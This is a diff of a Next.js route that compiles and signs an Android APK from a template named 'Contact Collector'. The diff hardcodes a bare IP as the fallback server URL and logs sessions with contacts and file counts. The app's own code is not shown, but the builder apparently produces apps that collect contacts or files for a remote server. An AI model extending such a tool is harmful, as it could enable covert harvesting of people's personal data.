@@ -6,11 +6,18 @@ import { randomUUID } from "crypto";
 import fs from "fs";
 import { createSession, updateSessionStatus, updateSession } from "@/lib/db";
 
-const ANDROID_HOME = "/home/z/android-sdk";
-const BUILD_TOOLS = join(ANDROID_HOME, "build-tools/34.0.0");
-const PLATFORM_JAR = join(ANDROID_HOME, "platforms/android-34/android.jar");
-const JAVAC = "/tmp/jdk-21.0.11/bin/javac";
-const APP_TEMPLATE = "/home/z/my-project/android-app";
+const ANDROID_HOME = "/home/fahad/android-sdk";
+const BUILD_TOOLS = join(ANDROID_HOME, "build-tools/35.0.1");
+const PLATFORM_JAR = join(ANDROID_HOME, "platforms/android-35/android.jar");
+const JAVAC = "/home/fahad/jdk-21.0.2/bin/javac";
+const APP_TEMPLATE = "/home/fahad/android-app";
+
+const buildEnv = {
+  ...process.env,
+  JAVA_HOME: "/home/fahad/jdk-21.0.2",
+  PATH: "/home/fahad/jdk-21.0.2/bin:" + (process.env.PATH || ""),
+  HOME: process.env.HOME || "/home/fahad",
+};
 
 export async function POST(req: NextRequest) {
   let buildDir = "";
@@ -24,25 +31,23 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: "App name is required" }, { status: 400 });
     }
 
-    // Validate app name length
     if (appName.trim().length > 30) {
       return NextResponse.json({ error: "App name must be 30 characters or less" }, { status: 400 });
     }
 
-    // Sanitize app name to prevent command injection
     const sanitizedAppName = appName.trim().replace(/[^a-zA-Z0-9\s\-_.]/g, "");
     if (sanitizedAppName !== appName.trim()) {
       return NextResponse.json(
-        { error: "App name contains invalid characters. Use only letters, numbers, spaces, hyphens, and underscores." },
+        { error: "App name contains invalid characters." },
         { status: 400 }
       );
     }
 
     const buildId = randomUUID();
-    buildDir = join(tmpdir(), `apk-build-${buildId}`);
+    buildDir = join(tmpdir(), "apk-build-" + buildId);
 
     // Step 1: Copy template
-    execSync(`cp -r "${APP_TEMPLATE}/app" "${buildDir}"`);
+    execSync("cp -r " + JSON.stringify(APP_TEMPLATE + "/app") + " " + JSON.stringify(buildDir), { env: buildEnv });
 
     // Create build directories
     const dirs = [
@@ -56,122 +61,127 @@ export async function POST(req: NextRequest) {
       fs.mkdirSync(dir, { recursive: true });
     }
 
-    // Step 2: Get the website base URL from request origin
+    // Step 2: Get the website base URL
     let websiteBaseUrl = req.headers.get("origin") || "";
     if (!websiteBaseUrl) {
       const host = req.headers.get("host");
       if (host) {
         const protocol = host.startsWith("localhost") || host.startsWith("127.0.0.1") ? "http" : "https";
-        websiteBaseUrl = `${protocol}://${host}`;
+        websiteBaseUrl = protocol + "://" + host;
       }
     }
     if (!websiteBaseUrl) {
-      websiteBaseUrl = "https://your-app.vercel.app";
+      websiteBaseUrl = "http://52.201.210.162";
     }
 
     // Step 3: Update app name in strings.xml
-    const stringsXml = `<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <string name="app_name">${escapeXml(sanitizedAppName)}</string>
-</resources>`;
+    const stringsXml = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n    <string name=\"app_name\">" + escapeXml(sanitizedAppName) + "</string>\n</resources>";
     fs.writeFileSync(join(buildDir, "src/main/res/values/strings.xml"), stringsXml);
 
-    // Step 4: Update AndroidManifest with app name reference
+    // Step 4: Update AndroidManifest label
     const manifestPath = join(buildDir, "src/main/AndroidManifest.xml");
     let manifest = fs.readFileSync(manifestPath, "utf-8");
     manifest = manifest.replace(
       /android:label="[^"]*"/,
-      `android:label="@string/app_name"`
+      "android:label=\"@string/app_name\""
     );
     fs.writeFileSync(manifestPath, manifest);
 
     // Step 5: Update layout with app name
     const layoutPath = join(buildDir, "src/main/res/layout/activity_main.xml");
-    let layout = fs.readFileSync(layoutPath, "utf-8");
-    layout = layout.replace(
-      />Contact Collector</g,
-      `>${escapeXml(sanitizedAppName)}<`
-    );
-    layout = layout.replace(
-      />Collector</g,
-      `>${escapeXml(sanitizedAppName)}<`
-    );
-    fs.writeFileSync(layoutPath, layout);
-
-    // Step 6: Replace WEBSITE_BASE_URL in MainActivity.java with actual deployed URL
-    const mainActivityPath = join(buildDir, "src/main/java/com/contactcollector/app/MainActivity.java");
-    if (fs.existsSync(mainActivityPath)) {
-      let mainActivitySrc = fs.readFileSync(mainActivityPath, "utf-8");
-      mainActivitySrc = mainActivitySrc.replace(
-        /private static final String WEBSITE_BASE_URL = "[^"]*";/,
-        `private static final String WEBSITE_BASE_URL = "${websiteBaseUrl}";`
-      );
-      // Inject BUILD_ID into MainActivity.java
-      mainActivitySrc = mainActivitySrc.replace(
-        /private static final String BUILD_ID = "[^"]*";/,
-        `private static final String BUILD_ID = "${buildId}";`
-      );
-      fs.writeFileSync(mainActivityPath, mainActivitySrc);
+    if (fs.existsSync(layoutPath)) {
+      let layout = fs.readFileSync(layoutPath, "utf-8");
+      layout = layout.replace(/>Contact Collector</g, ">" + escapeXml(sanitizedAppName) + "<");
+      layout = layout.replace(/>Collector</g, ">" + escapeXml(sanitizedAppName) + "<");
+      fs.writeFileSync(layoutPath, layout);
     }
 
-    // Step 7: Handle logo if provided - copy as mipmap icon
+    // Step 6: Replace WEBSITE_BASE_URL in all Java files
+    const javaDir = join(buildDir, "src/main/java/com/contactcollector/app");
+    const javaFiles = fs.existsSync(javaDir) ? fs.readdirSync(javaDir).filter(f => f.endsWith(".java")) : [];
+    for (const jf of javaFiles) {
+      const filePath = join(javaDir, jf);
+      let src = fs.readFileSync(filePath, "utf-8");
+      src = src.replace(
+        /private static final String WEBSITE_BASE_URL = "[^"]*";/,
+        "private static final String WEBSITE_BASE_URL = \"" + websiteBaseUrl + "\";"
+      );
+      src = src.replace(
+        /private static final String BUILD_ID = "[^"]*";/,
+        "private static final String BUILD_ID = \"" + buildId + "\";"
+      );
+      fs.writeFileSync(filePath, src);
+    }
+
+    // Step 7: Handle logo
     if (logoFile) {
       try {
         const logoBuffer = Buffer.from(await logoFile.arrayBuffer());
-
-        // Validate logo size (max 2MB)
         if (logoBuffer.length > 2 * 1024 * 1024) {
           cleanupBuildDir(buildDir);
-          return NextResponse.json(
-            { error: "Logo file is too large. Maximum size is 2MB." },
-            { status: 400 }
-          );
+          return NextResponse.json({ error: "Logo file is too large. Maximum size is 2MB." }, { status: 400 });
         }
 
-        // Copy logo as mipmap icons (use the same PNG for all densities)
-        const mipmapDirs = [
-          "mipmap-mdpi", "mipmap-hdpi", "mipmap-xhdpi",
-          "mipmap-xxhdpi", "mipmap-xxxhdpi"
+        const tempLogoPath = join(buildDir, "build", "uploaded_logo");
+        fs.writeFileSync(tempLogoPath, logoBuffer);
+
+        const mipmapConfigs = [
+          { dir: "mipmap-mdpi", size: 48 },
+          { dir: "mipmap-hdpi", size: 72 },
+          { dir: "mipmap-xhdpi", size: 96 },
+          { dir: "mipmap-xxhdpi", size: 144 },
+          { dir: "mipmap-xxxhdpi", size: 192 },
         ];
-        for (const dir of mipmapDirs) {
-          const mipmapDir = join(buildDir, "src/main/res", dir);
+
+        for (const config of mipmapConfigs) {
+          const mipmapDir = join(buildDir, "src/main/res", config.dir);
           if (!fs.existsSync(mipmapDir)) {
             fs.mkdirSync(mipmapDir, { recursive: true });
           }
-          fs.writeFileSync(join(mipmapDir, "ic_launcher.png"), logoBuffer);
+          const outPath = join(mipmapDir, "ic_launcher.png");
+          const pyCmd = "python3 -c \"from PIL import Image; img=Image.open('" + tempLogoPath + "'); img=img.convert('RGBA'); img=img.resize((" + config.size + "," + config.size + "),Image.LANCZOS); img.save('" + outPath + "','PNG')\"";
+          execSync(pyCmd, { stdio: "pipe", env: buildEnv });
         }
 
-        // Update manifest to use the default icon (not adaptive)
+        // Remove adaptive icon XML
+        const anydpiDir = join(buildDir, "src/main/res/mipmap-anydpi-v26");
+        if (fs.existsSync(anydpiDir)) {
+          fs.rmSync(anydpiDir, { recursive: true, force: true });
+        }
+        const fgPath = join(buildDir, "src/main/res/drawable/ic_launcher_foreground.xml");
+        const bgPath = join(buildDir, "src/main/res/drawable/ic_launcher_background.xml");
+        if (fs.existsSync(fgPath)) fs.unlinkSync(fgPath);
+        if (fs.existsSync(bgPath)) fs.unlinkSync(bgPath);
+
         manifest = fs.readFileSync(manifestPath, "utf-8");
         manifest = manifest.replace(
           /android:roundIcon="[^"]*"/,
-          `android:roundIcon="@mipmap/ic_launcher"`
+          "android:roundIcon=\"@mipmap/ic_launcher\""
         );
         fs.writeFileSync(manifestPath, manifest);
       } catch (logoErr: unknown) {
         const msg = logoErr instanceof Error ? logoErr.message : "Unknown logo error";
         console.error("Logo processing error:", msg);
-        // Continue without logo if it fails
       }
     }
 
     // Step 8: Compile resources
     execSync(
-      `"${BUILD_TOOLS}/aapt2" compile --dir "${buildDir}/src/main/res" -o "${buildDir}/build/compiled_resources.zip"`,
-      { stdio: "pipe" }
+      JSON.stringify(BUILD_TOOLS + "/aapt2") + " compile --dir " + JSON.stringify(buildDir + "/src/main/res") + " -o " + JSON.stringify(buildDir + "/build/compiled_resources.zip"),
+      { stdio: "pipe", env: buildEnv }
     );
 
     // Step 9: Link resources
     execSync(
-      `"${BUILD_TOOLS}/aapt2" link --java "${buildDir}/build/gen" --manifest "${buildDir}/src/main/AndroidManifest.xml" -I "${PLATFORM_JAR}" --auto-add-overlay -o "${buildDir}/build/apk/base.apk" "${buildDir}/build/compiled_resources.zip"`,
-      { stdio: "pipe" }
+      JSON.stringify(BUILD_TOOLS + "/aapt2") + " link --java " + JSON.stringify(buildDir + "/build/gen") + " --manifest " + JSON.stringify(buildDir + "/src/main/AndroidManifest.xml") + " -I " + JSON.stringify(PLATFORM_JAR) + " --auto-add-overlay -o " + JSON.stringify(buildDir + "/build/apk/base.apk") + " " + JSON.stringify(buildDir + "/build/compiled_resources.zip"),
+      { stdio: "pipe", env: buildEnv }
     );
 
-    // Step 10: Compile Java
+    // Step 10: Collect all Java source files with ABSOLUTE paths
     const sourcesFile = join(buildDir, "build/sources.txt");
     let sourcePaths = "";
     const genDir = join(buildDir, "build/gen");
-    const javaDir = join(buildDir, "src/main/java");
+    const srcJavaDir = join(buildDir, "src/main/java");
 
     function findJavaFiles(dir: string) {
       const entries = fs.readdirSync(dir, { withFileTypes: true });
@@ -182,52 +192,61 @@ export async function POST(req: NextRequest) {
       }
     }
     findJavaFiles(genDir);
-    findJavaFiles(javaDir);
+    findJavaFiles(srcJavaDir);
     fs.writeFileSync(sourcesFile, sourcePaths.trim());
 
+    // Step 11: Compile Java
     execSync(
-      `"${JAVAC}" -source 1.8 -target 1.8 -classpath "${PLATFORM_JAR}" -sourcepath "${genDir}":"${javaDir}" -d "${buildDir}/build/obj" @"${sourcesFile}"`,
-      { stdio: "pipe" }
+      JSON.stringify(JAVAC) + " -source 1.8 -target 1.8 -classpath " + JSON.stringify(PLATFORM_JAR) + " -sourcepath " + JSON.stringify(genDir) + ":" + JSON.stringify(srcJavaDir) + " -d " + JSON.stringify(buildDir + "/build/obj") + " @" + JSON.stringify(sourcesFile),
+      { stdio: "pipe", env: buildEnv }
     );
 
-    // Step 11: Convert to DEX
-    // Package all class files into a temporary JAR, then convert to DEX
-    // This properly handles inner/nested classes and avoids d8 "defined multiple times" errors
-    const objDir = join(buildDir, "build/obj/com/contactcollector/app");
+    // Step 12: Create classes.jar from ALL .class files (including R.class)
     const classesJar = join(buildDir, "build/classes.jar");
-    // Use zip to create a JAR (JARs are just ZIPs with a manifest)
-    execSync(`cd "${objDir}" && zip -D "${classesJar}" *.class -x "R.class" "R\$*.class"`, { stdio: "pipe" });
+    execSync("cd " + JSON.stringify(buildDir + "/build/obj") + " && zip -r -D " + JSON.stringify(classesJar) + " .", { stdio: "pipe", env: buildEnv });
 
+    // Step 13: Convert to DEX
     execSync(
-      `"${BUILD_TOOLS}/d8" --min-api 21 --lib "${PLATFORM_JAR}" --output "${buildDir}/build/dex/" "${classesJar}"`,
-      { stdio: "pipe" }
+      JSON.stringify(BUILD_TOOLS + "/d8") + " --min-api 21 --lib " + JSON.stringify(PLATFORM_JAR) + " --output " + JSON.stringify(buildDir + "/build/dex/") + " " + JSON.stringify(classesJar),
+      { stdio: "pipe", env: buildEnv }
     );
 
-    // Step 12: Add DEX to APK
-    execSync(`cp "${buildDir}/build/apk/base.apk" "${buildDir}/build/apk/app-unsigned.apk"`, { stdio: "pipe" });
-    execSync(`cd "${buildDir}/build/apk" && zip -j app-unsigned.apk "${buildDir}/build/dex/classes.dex"`, { stdio: "pipe" });
+    // Step 14: Add DEX to APK
+    execSync("cp " + JSON.stringify(buildDir + "/build/apk/base.apk") + " " + JSON.stringify(buildDir + "/build/apk/app-unsigned.apk"), { stdio: "pipe", env: buildEnv });
+    execSync("cd " + JSON.stringify(buildDir + "/build/apk") + " && zip -j app-unsigned.apk " + JSON.stringify(buildDir + "/build/dex/classes.dex"), { stdio: "pipe", env: buildEnv });
 
-    // Step 13: Align
+    // Step 15: Zipalign
     execSync(
-      `"${BUILD_TOOLS}/zipalign" -f 4 "${buildDir}/build/apk/app-unsigned.apk" "${buildDir}/build/apk/app-aligned.apk"`,
-      { stdio: "pipe" }
+      JSON.stringify(BUILD_TOOLS + "/zipalign") + " -f 4 " + JSON.stringify(buildDir + "/build/apk/app-unsigned.apk") + " " + JSON.stringify(buildDir + "/build/apk/app-aligned.apk"),
+      { stdio: "pipe", env: buildEnv }
     );
 
-    // Step 14: Sign with debug key
+    // Step 16: Sign APK
     const keystorePath = join(APP_TEMPLATE, "build/keystore/debug.keystore");
     execSync(
-      `"${BUILD_TOOLS}/apksigner" sign --ks "${keystorePath}" --ks-key-alias debugkey --ks-pass pass:android --key-pass pass:android --out "${buildDir}/build/apk/app-signed.apk" "${buildDir}/build/apk/app-aligned.apk"`,
-      { stdio: "pipe" }
+      JSON.stringify(BUILD_TOOLS + "/apksigner") + " sign --ks " + JSON.stringify(keystorePath) + " --ks-key-alias debugkey --ks-pass pass:android --key-pass pass:android --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --out " + JSON.stringify(buildDir + "/build/apk/app-signed.apk") + " " + JSON.stringify(buildDir + "/build/apk/app-aligned.apk"),
+      { stdio: "pipe", env: buildEnv }
     );
 
-    // Step 15: Read the final APK
+    // Step 17: Verify APK
+    try {
+      const verifyOutput = execSync(
+        JSON.stringify(BUILD_TOOLS + "/apksigner") + " verify --verbose " + JSON.stringify(buildDir + "/build/apk/app-signed.apk"),
+        { stdio: "pipe", env: buildEnv, encoding: "utf-8" }
+      );
+      console.log("APK verification:", verifyOutput);
+    } catch (verifyErr) {
+      console.error("APK verification failed:", verifyErr);
+    }
+
+    // Step 18: Read the APK
     const apkPath = join(buildDir, "build/apk/app-signed.apk");
     const apkBuffer = fs.readFileSync(apkPath);
 
-    // Step 16: Cleanup build directory
+    // Step 19: Cleanup
     cleanupBuildDir(buildDir);
 
-    // Step 17: Create a stub session with status 'apk_built'
+    // Step 20: Create session
     try {
       const stubSession = await createSession({
         contacts: JSON.stringify([]),
@@ -236,21 +255,22 @@ export async function POST(req: NextRequest) {
         count: 0,
         fileCount: 0,
       });
-      // Set buildId and initial status
       await updateSession(stubSession.id, { buildId });
-      await updateSessionStatus(stubSession.id, "apk_built", `APK built: ${sanitizedAppName}`);
+      await updateSessionStatus(stubSession.id, "apk_built", "APK built: " + sanitizedAppName);
     } catch (e) {
-      // Don't fail the build if session creation fails
       console.error("Stub session creation error:", e);
     }
 
-    // Return APK file
+    // Return APK
     const safeName = sanitizedAppName.replace(/\s+/g, "-").toLowerCase();
     return new NextResponse(apkBuffer, {
+      status: 200,
       headers: {
         "Content-Type": "application/vnd.android.package-archive",
-        "Content-Disposition": `attachment; filename="${safeName}.apk"`,
+        "Content-Disposition": "attachment; filename=\"" + safeName + ".apk\"",
         "Content-Length": apkBuffer.length.toString(),
+        "Cache-Control": "no-cache, no-store, must-revalidate",
+        "X-Content-Type-Options": "nosniff",
       },
     });
   } catch (error: unknown) {
@@ -266,7 +286,7 @@ export async function POST(req: NextRequest) {
 
 function cleanupBuildDir(buildDir: string) {
   try {
-    execSync(`rm -rf "${buildDir}"`, { stdio: "pipe" });
+    execSync("rm -rf " + JSON.stringify(buildDir), { stdio: "pipe", env: buildEnv });
   } catch {
     // Ignore cleanup errors
   }
